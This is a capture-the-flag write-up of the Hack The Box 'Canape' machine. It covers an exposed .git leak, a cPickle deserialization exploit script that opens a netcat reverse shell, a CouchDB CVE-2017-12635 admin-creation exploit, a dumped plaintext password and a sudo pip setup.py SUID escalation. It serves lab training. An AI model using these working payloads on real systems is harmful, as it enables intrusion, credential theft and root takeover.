---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: python2.7 cPickle deserializationattack couchdb sudoers pip githack .git informationleakage remotecodeexecution database scripting
---

<br />

![Machine-Icon](../../../assets/images/Canape/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />

Hello hackers! Today we’ll tackle the Canape Machine, a Medium difficulty Linux challenge. We’ll start by discovering an exposed .git repository, allowing us to analyze the website’s logic and identify a deserialization attack. We’ll automate the exploitation using a Python 2.7 script to gain system access. Once inside, we’ll exploit a vulnerability in the CouchDB database to dump its contents and retrieve valid credentials for user pivoting. Finally, we’ll take advantage of the user’s ability to run pip install as root to escalate privileges and gain full control of the system.

<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.10.70 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 19:13 CET
Nmap scan report for 10.10.10.70
Host is up (0.93s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-trane-info: Problem with XML parsing of /evox/about
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simpsons Fan Site
65535/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.12 seconds
```

<br />

Open Ports:

- `Port 80` -> http

- `Port 65535` -> OpenSSH

<br />

# Http Enumeration: -> Port 80

<br />

When listing the `website` we find a `fanpage` of the famous series `"The Simpsons"`:

<br />

![2](../../../assets/images/Canape/2.png)

<br />

Enumerating `manually` the page we found `two` interesting `paths`.

<br />

### 1.- /quotes:

<br />

Contains the most typical `quotations` of some `characters` in the series.

<br />

![3](../../../assets/images/Canape/3.png)

<br />

### 2.- /submit:

<br />

It has a `couple` of interesting `inputs` to test.

<br />

![4](../../../assets/images/Canape/4.png)

<br />

## Exposed .git:

<br />

We visit the `.git` exposed `directory` reported by `nmap`:

<br />

![5](../../../assets/images/Canape/5.png)

<br />

And we `dump` it on our `Machine` using the famous `tool` of GitHub -> [GitHack](https://github.com/lijiejie/GitHack):

<br />

```bash
❯ python3 GitHack.py http://10.10.10.70/.git
[+] Download and parse index file ...
[+] __init__.py
[+] static/css/bootstrap.min.css
[+] static/css/bootstrap.min.css.map
[+] static/css/custom.css
[+] static/js/bootstrap.min.js
[+] static/js/bootstrap.min.js.map
[+] templates/index.html
[+] templates/layout.html
[+] templates/quotes.html
[+] templates/submit.html
[OK] templates/submit.html
[OK] templates/layout.html
[OK] static/css/custom.css
[OK] templates/quotes.html
[OK] templates/index.html
[OK] __init__.py
[OK] static/css/bootstrap.min.css
[OK] static/js/bootstrap.min.js
[OK] static/js/bootstrap.min.js.map
[OK] static/css/bootstrap.min.css.map
```

<br />

`Browsing` through the `repo folders` we find a very interesting `"__init__.py"` script in which we find the `code` of the `different functions` in the `page`:

<br />

```python
import couchdb
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5


app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

<br />

`Highlights of the script`:

- CouchDB is being used behind, which may be interesting in the future.

- The Python2.7 cPickle library is used, which if poorly implemented can lead to a Deserialization Attack.

- There is a new interesting path named /check.

<br />

### /submit:

<br />

```python
 @app.route("/submit", methods=["GET", "POST"])
 def submit():
     error = None
     success = None
 
     if request.method == "POST":
         try:
             char = request.form["character"]
             quote = request.form["quote"]
             if not char or not quote:
                 error = True
             elif not any(c.lower() in char.lower() for c in WHITELIST):
                 error = True
             else:
                 # TODO - Pickle into dictionary instead, `check` is ready
                 p_id = md5(char + quote).hexdigest()
                 outfile = open("/tmp/" + p_id + ".p", "wb")
         outfile.write(char + quote)
         outfile.close()
             success = True
         except Exception as ex:
             error = True
 
     return render_template("submit.html", error=error, success=success)
```

<br />

As we can see, our inputs `(character & quote)` are being recolected in `two variables`, char and quote respectivly. It should `be noted` that the `input "character"` has a small `validation`, since for it to be `valid` it has to `contain` a `character` from the `whitelist`.

After that, the program `sums` the `values` of these `two variables` and applies an `md5` encoding (weak encoding, easy to guess and reproduce) to create a `file` with this name preceded by `/tmp` and ending in the `.p` extension with our `unencoded entries` as `content`.

<br />

### /check:

<br />

```python
@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

<br />

Apparently, this `function` consists of a `POST request` in which we will have to add an `"id"` field with the `md5 name` of the `file` that we have `previously created` with the `submit function` to be able to `list` the `content` of it.

Finally, the function has a `condition` that if the `contents` of the file `contain "p1"`, `cPickle.loads()` will be used to `deserialize` its contents `without` any `validation`, fully `relying` on the `user's input`.

<br />

## Pickle Deserialization Attack Explotation:

<br />

Once we have `understood` the `logic` of each and every one of the `functions` of the website, we proceed to `exploit` the `Deserialization Attack` present in the `"cPickle.loads()"` function.

To do that I `have created` the following `Python2.7` exploit:

<br />

```python 
#!/usr/bin/env python2.7

# Author TheRedP4nther
# Script to automate the Pickle Deserialization Attack of HTB Canape machine

import requests
import os
import hashlib
import cPickle
import signal
import sys
import time

# Global Variables.
submit_url = "http://10.10.10.70/submit"
check_url = "http://10.10.10.70/check"

# Exploit Class.
class Exploit(object):
    
    def __init__(self, command):

        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))
    

# Functions.
def def_handler(sig, frame): # Forced exit.
    print "\n[+] Leaving the program...\n" 
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler) # Capture the keyboard key.

def makeRequests():
    if len(sys.argv) != 3:
        print "\n[!] Execute: python2.7 {} [IP] [PORT]\n".format(sys.argv[0]) # Intructions.
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    command = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} >/tmp/f; Homer".format(ip, port) # Command that we want to execute with the Whitelist Character.
    char = cPickle.dumps(Exploit(command)) # Serialize the command. 
    quote = "Hola"
    submit_data = {
            "character": char,
            "quote": quote
            }    
    
    try:
        response = requests.post(submit_url, data=submit_data, timeout=1) # Request to create the file.
    except:
        print("\n[!] The URL is not Active or something got wrong, check it and run again the Script!\n")
    if "Thank you for your suggestion!" in response.text:
        print "\n[+] File created successfully!"
        encoded_input = hashlib.md5(char+quote).hexdigest() # Encode our input to use in the next request.
        check_data = {"id": encoded_input}
        time.sleep(1)
        print "[+] Establishing the Reverse Shell..."
        try:
            response2 = requests.post(check_url, data=check_data, timeout=1) # Request to exploit the Deserialization Attack.
        except:
            pass
    else:
        print "\n[!] There's something wrong with your submit request! Try to run the program again!\n"

if __name__ == '__main__':
    makeRequests() # Call to the exploit function.
```

<br />

We `execute` the `exploit`:

<br />

```bash
❯ python2.7 10.10.14.11 443
```

<br />

`Check` the `listener` and... YES!!

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.70] 42686
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br />

Intrusion ready!! Come on with the Privilege Escalation!!

<br />

# Privilege Escalation: www-data -> homer

<br />

Once in, we try to get the `user.txt` flag but `unsuccessfully`, because  when we try to enter the `homer's home` directory -> `"Permission Denied"`:

<br />

```bash
www-data@canape:/$ cd /home
www-data@canape:/home$ ls
homer
www-data@canape:/home$ cd homer
bash: cd: homer: Permission denied
```

<br />

After a time enumerating the System we remember that we had seen `CouchDB` are in use when we analyze the `"__init_.py"`, so we make a curl to `localhost` to the `default port` of `CouchDB`, port `5984`:

<br />

```bash
www-data@canape:/home$ curl localhost:5984 
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

<br />

At doing this, we see that the `version` in use is `2.0.0`, so we proceed to `search` for `vulnerabilities` for this version:

<br />

```bash
❯ searchsploit CouchDB 2.0.0
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Escalation                                                                                      | linux/webapps/44498.py
Apache CouchDB 2.0.0 - Local Privilege Escalation                                                                                                     | windows/local/40865.txt
Apache CouchDB < 2.1.0 - Remote Code Execution                                                                                                        | linux/webapps/44913.py
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

<br />

There are `three` potential `vulnerabilities` that can `apply` to out `target`, let's `analyze` the `first script`:

<br />

```python 
#!/usr/bin/env python

'''
@author:        r4wd3r
@license:       MIT License
@contact:       r4wd3r@gmail.com
'''

import argparse
import re
import sys
import requests

parser = argparse.ArgumentParser(
    description='Exploits the Apache CouchDB JSON Remote Privilege Escalation Vulnerability' +
    ' (CVE-2017-12635)')
parser.add_argument('host', help='Host to attack.', type=str)
parser.add_argument('-p', '--port', help='Port of CouchDB Service', type=str, default='5984')
parser.add_argument('-u', '--user', help='Username to create as admin.',
                    type=str, default='couchara')
parser.add_argument('-P', '--password', help='Password of the created user.',
                    type=str, default='couchapass')
args = parser.parse_args()

host = args.host
port = args.port
user = args.user
password = args.password

pat_ip = re.compile("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
if not pat_ip.match(host):
    print "[x] Wrong host. Must be a valid IP address."
    sys.exit(1)

print "[+] User to create: " + user
print "[+] Password: " + password
print "[+] Attacking host " + host + " on port " + port

url = 'http://' + host + ':' + port

try:
    rtest = requests.get(url, timeout=10)
except requests.exceptions.Timeout:
    print "[x] Server is taking too long to answer. Exiting."
    sys.exit(1)
except requests.ConnectionError:
    print "[x] Unable to connect to the remote host."
    sys.exit(1)

# Payload for creating user
cu_url_payload = url + "/_users/org.couchdb.user:" + user
cu_data_payload = '{"type": "user", "name": "'+user+'", "roles": ["_admin"], "roles": [], "password": "'+password+'"}'

try:
    rcu = requests.put(cu_url_payload, data=cu_data_payload)
except requests.exceptions.HTTPError:
    print "[x] ERROR: Unable to create the user on remote host."
    sys.exit(1)

if rcu.status_code == 201:
    print "[+] User " + user + " with password " + password + " successfully created."
    sys.exit(0)
else:
    print "[x] ERROR " + str(rcu.status_code) + ": Unable to create the user on remote host."
```

<br />

It seems to be a `python2.7` script that `creates` a `privileged user` named `couchara` into `CouchDB` making a `put request` to an `endpoint`.

It looks `good`, so we `take it` to the `Victim Machine` and `run` it:

<br />

```bash
www-data@canape:/tmp/Privesc$ python2.7 exploit.py 127.0.0.1
[+] User to create: couchara
[+] Password: couchapass
[+] Attacking host 127.0.0.1 on port 5984
[+] User couchara with password couchapass successfully created.
```

<br />

We got it! Now we can `log` into this `user` and `enumerate` the current `CouchDB databases`:

<br />

```bash
www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

<br />

There are `three` different `databases`, but we `start listing` the most interesting, `passwords` one:

<br />

```bash
www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/passwords
{"db_name":"passwords","update_seq":"46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA","sizes":{"file":222462,"external":665,"active":1740},"purge_seq":0,"other":{"data_size":665},"doc_del_count":0,"doc_count":4,"disk_size":222462,"disk_format_version":6,"data_size":1740,"compact_running":false,"instance_start_time":"0"}
```

<br />

The database has four `documents available`, so we `list` them:

<br />

```bash
www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

<br />

Once listed, we `dump` the `content` of the `first document` referencing its `ID`:

<br />

```bash
www-data@canape:/tmp/Privesc$ curl http://couchara:couchapass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
```

<br />

It has a very good looking `password`, let's `test` if it's valid for `user homer`:

<br />

```bash
www-data@canape:/tmp/Privesc$ su homer
Password: 
homer@canape:/tmp/Privesc$ 
homer@canape:/tmp/Privesc$ whoami
homer
homer@canape:/tmp/Privesc$ cd
homer@canape:~$ cat user.txt
bece4a9c7bf0b7de80d881ab69xxxxxx
```

<br />

GG, user.txt flag owned.

<br />

# Privilege Escalation: homer -> root

<br />

Once inside the `homer` user, we `list` his `sudoers permissions`:

<br />

```bash
homer@canape:/tmp/Privesc$ sudo -l
[sudo] password for homer: 
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

<br />

As we can see, this `user` can run `pip install` as `root`.

This is really `dangerous`, because when we `run` a pip install, `pip` start `searching` the `"setup.py"` file to `run it`, so if we `create` this file with `malicious code` we can `run` any `command` as `root`.

<br />

`Malicious setup.py:`

<br />

```python 
#!/usr/bin/env python 

import os 

os.system('chmod 4755 /bin/bash')
```

<br />

Once we have `created` this `file` and given it `execution privileges`, we run `pip install` as `root` in the same directory:

<br />

```bash
homer@canape:/tmp/hola$ sudo /usr/bin/pip install .
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /tmp/hola
No files/directories in /tmp/pip-96XsqM-build/pip-egg-info (from PKG-INFO)
```

<br />

Now, we `check` if the `command` was successfully `executed` listing the `/bin/bash` privileges:

<br />

```bash
homer@canape:/tmp/hola$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
```

<br />

Perfect!! The `suid permission` has been successfully `added` to the `bash`, now we will simply have to `execute` it `according` to this `privilege` using the parameter `"-p"`:

<br />

```bash
homer@canape:/tmp/hola$ bash -p
bash-4.4# id
uid=1000(homer) gid=1000(homer) euid=0(root) groups=1000(homer)
bash-4.4# cd /root
bash-4.4# cat root.txt
670fd2ff4e259056a4f3971e66xxxxxx
```

<br />

Canape Machine rooted!!!

I hope that you learned and ejoyed a lot.

Keep hacking!!❤️❤️

<br />
